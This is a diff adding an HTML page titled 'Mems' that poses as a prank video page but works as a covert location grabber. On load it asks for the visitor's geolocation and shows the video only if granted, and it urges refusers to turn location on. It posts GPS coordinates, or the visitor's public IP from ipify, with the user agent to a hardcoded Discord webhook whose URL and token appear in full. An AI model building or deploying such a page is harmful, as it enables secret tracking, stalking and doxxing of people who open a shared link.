@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mems</title>
+</head>
+<body onload="getLocation()">
+    <center id="videoContainer" style="display:none;">
+        <video controls autoplay>
+            <source src="Prank.mp4" type="video/mp4">
+        </video>    
+    </center>
+
+    <p id="demo"></p>
+
+    <script>
+        var x = document.getElementById("demo");
+        var videoContainer = document.getElementById("videoContainer");
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    showPosition, 
+                    handleError // Handle denial or errors
+                );
+            } else {
+                x.innerHTML = "Geo Location is not supported by this browser.";
+                sendFallbackData(); // Send fallback if geolocation not supported
+            }
+        }
+
+        function showPosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+
+            // Show video if location is allowed
+            videoContainer.style.display = "block";
+
+            // Send data to Discord webhook
+            sendToDiscord(latitude, longitude);
+        }
+
+        function handleError(error) {
+            console.error("Geolocation error:", error);
+            x.innerHTML = "Location access denied please turn on your location to play the Mems video.";
+            sendFallbackData(); // Send fallback data (IP + User Agent)
+        }
+
+        function sendFallbackData() {
+            // Fetch IP address and send it along with user agent
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    sendToDiscord(null, null, ip); // Send only IP and user agent
+                })
+                .catch(error => console.error("Error fetching IP address:", error));
+        }
+
+        function sendToDiscord(latitude, longitude, ip = null) {
+            const webhookURL = "https://discordapp.com/api/webhooks/1331243589484679188/5cCF_ojg69MQZcJ-9r9UsMjEuOsXIgt_JDSoWN9EzUn5oZCtcJAzc8DsdLPzHl8X2P_a";
+            const data = {
+                content: latitude && longitude
+                    ? `**GPS Coordinates:**\nLatitude: ${latitude}\nLongitude: ${longitude}\n**User Agent:** ${navigator.userAgent}`
+                    : `**IP Address:** ${ip}\n**User Agent:** ${navigator.userAgent}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => console.log("Data sent to Discord"))
+            .catch(error => console.error("Error sending data to Discord:", error));
+        }
+    </script>
+</body>
+</html>
